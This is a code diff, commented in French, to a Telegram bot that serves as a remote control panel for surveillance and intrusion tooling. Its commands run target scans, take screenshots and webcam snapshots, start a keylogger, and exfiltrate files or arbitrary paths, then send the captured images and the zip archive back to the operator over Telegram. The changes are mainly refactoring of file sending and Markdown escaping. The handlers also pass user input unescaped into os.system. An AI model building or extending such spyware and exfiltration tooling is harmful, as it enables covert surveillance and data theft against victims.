@@ -2,25 +2,27 @@
 
 import os
 from pathlib import Path
-from telegram import Update, InputFile
+from telegram import Update
 from telegram.ext import (
     CommandHandler, ContextTypes, Application
 )
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
 
 from modules.utils import get_api_keys
 
-# === Clés API ===
+# === 🔐 Clés API
 api = get_api_keys()
 TOKEN = api.get("TELEGRAM_BOT_TOKEN")
 if not TOKEN:
     raise EnvironmentError("❌ TELEGRAM_BOT_TOKEN est manquant dans .env")
 
-# === Répertoires ===
+# === 📁 Répertoires
 BASE_DIR = Path(__file__).resolve().parent.parent
 OUTPUTS = BASE_DIR / "outputs"
 SCREENSHOTS = OUTPUTS / "screenshots"
 
-# === Commandes ===
+# === 📌 Commandes
 
 async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -34,7 +36,7 @@ async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📤 `/exfiltrate`\n"
         "📂 `/exfiltrate_path <chemin>`\n"
         "🧾 `/rapport`\n",
-        parse_mode="Markdown"
+        parse_mode=ParseMode.MARKDOWN
     )
 
 async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -42,14 +44,24 @@ async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("❗ Usage : /osint <ip ou domaine>")
     cible = context.args[0]
     os.system(f"python main.py --target {cible} --osint")
-    await update.message.reply_document(InputFile(OUTPUTS / "osint.txt"))
+    path = OUTPUTS / "osint.txt"
+    if path.exists():
+        with open(path, "rb") as f:
+            await update.message.reply_document(document=f, filename="osint.txt")
+    else:
+        await update.message.reply_text("❌ Fichier OSINT introuvable.")
 
 async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         return await update.message.reply_text("❗ Usage : /scan <ip>")
     cible = context.args[0]
     os.system(f"python main.py --target {cible} --scan")
-    await update.message.reply_document(InputFile(OUTPUTS / "scan_results.txt"))
+    path = OUTPUTS / "scan_results.txt"
+    if path.exists():
+        with open(path, "rb") as f:
+            await update.message.reply_document(document=f, filename="scan_results.txt")
+    else:
+        await update.message.reply_text("❌ Résultats de scan introuvables.")
 
 async def exploit_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
@@ -60,9 +72,10 @@ async def exploit_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
     os.system("python modules/exploit_sys.py --screenshot")
-    screenshot_path = SCREENSHOTS / "screenshot_latest.png"
-    if screenshot_path.exists():
-        await update.message.reply_document(InputFile(screenshot_path))
+    path = SCREENSHOTS / "screenshot_latest.png"
+    if path.exists():
+        with open(path, "rb") as f:
+            await update.message.reply_document(document=f, filename="screenshot_latest.png")
     else:
         await update.message.reply_text("❌ Aucune capture trouvée.")
 
@@ -72,17 +85,19 @@ async def keylogger_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def webcam_snap(update: Update, context: ContextTypes.DEFAULT_TYPE):
     os.system("python modules/exploit_sys.py --webcam")
-    webcam_path = SCREENSHOTS / "webcam_latest.png"
-    if webcam_path.exists():
-        await update.message.reply_document(InputFile(webcam_path))
+    path = SCREENSHOTS / "webcam_latest.png"
+    if path.exists():
+        with open(path, "rb") as f:
+            await update.message.reply_document(document=f, filename="webcam_latest.png")
     else:
         await update.message.reply_text("❌ Aucune image webcam trouvée.")
 
 async def exfiltrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     os.system("python main.py --exfil")
-    archive = OUTPUTS / "exfiltrated.zip"
-    if archive.exists():
-        await update.message.reply_document(InputFile(archive))
+    path = OUTPUTS / "exfiltrated.zip"
+    if path.exists():
+        with open(path, "rb") as f:
+            await update.message.reply_document(document=f, filename="exfiltrated.zip")
     else:
         await update.message.reply_text("❌ Aucune archive exfiltrée trouvée.")
 
@@ -91,20 +106,25 @@ async def exfiltrate_path(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("❗ Usage : /exfiltrate_path <chemin>")
     chemin = " ".join(context.args)
     os.system(f"python main.py --exfiltrate_path \"{chemin}\"")
-    await update.message.reply_text(f"📂 Exfiltration de `{chemin}` terminée.", parse_mode="Markdown")
+    chemin_escaped = escape_markdown(chemin, version=2)
+    await update.message.reply_text(
+        f"📂 Exfiltration de `{chemin_escaped}` terminée.",
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
 
 async def rapport(update: Update, context: ContextTypes.DEFAULT_TYPE):
     os.system("python modules/reporting.py")
-    rapport_path = OUTPUTS / "rapport_final.txt"
-    if rapport_path.exists():
-        await update.message.reply_document(InputFile(rapport_path))
+    path = OUTPUTS / "rapport_final.txt"
+    if path.exists():
+        with open(path, "rb") as f:
+            await update.message.reply_document(document=f, filename="rapport_final.txt")
     else:
         await update.message.reply_text("❌ Rapport introuvable.")
 
-# === Instance Application (pour webhook.py) ===
+# === 📲 Instance Application pour webhook
 application: Application = Application.builder().token(TOKEN).build()
 
-# === Ajout des handlers ===
+# === 🧩 Handlers
 application.add_handler(CommandHandler("menu", menu))
 application.add_handler(CommandHandler("osint", osint))
 application.add_handler(CommandHandler("scan", scan))
